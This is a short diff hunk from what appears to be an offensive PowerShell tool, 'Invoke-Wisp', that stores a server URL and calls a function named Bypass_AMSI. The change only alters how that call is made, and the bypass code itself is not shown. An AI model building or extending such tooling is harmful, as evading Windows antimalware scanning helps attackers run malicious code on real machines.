@@ -8,7 +8,7 @@ function Invoke-Wisp {
     [Parameter(Mandatory, HelpMessage = "Please provide a server url address using -url 'http://<your_server>/'")]
     Param([string]$url)
     $global:url_1029384756=$url
-    bypass_amsi
+    . bypass_amsi
 }
 
 function Bypass_AMSI {
